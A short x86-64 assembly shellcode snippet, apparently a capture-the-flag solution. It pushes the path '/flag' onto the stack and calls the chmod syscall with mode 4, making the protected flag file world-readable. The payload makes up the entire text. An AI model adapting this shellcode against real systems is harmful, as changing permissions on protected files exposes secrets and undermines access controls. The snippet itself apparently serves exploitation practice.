.global _start
_start:
.intel_syntax noprefix
mov rbx, 0x00000067616c662f
push rbx
mov rax, 0x5a
mov rdi, rsp
mov rsi, 0x4
syscall
